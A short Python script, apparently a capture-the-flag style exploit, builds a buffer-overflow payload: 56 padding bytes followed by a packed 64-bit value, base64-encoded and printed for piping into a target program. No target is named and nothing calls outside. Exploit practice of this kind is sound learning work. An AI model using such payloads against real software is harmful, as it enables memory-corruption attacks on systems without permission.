
import sys
import struct
import base64

buf = b'VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV'
buf += struct.pack('<Q', 3027278932212584334)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
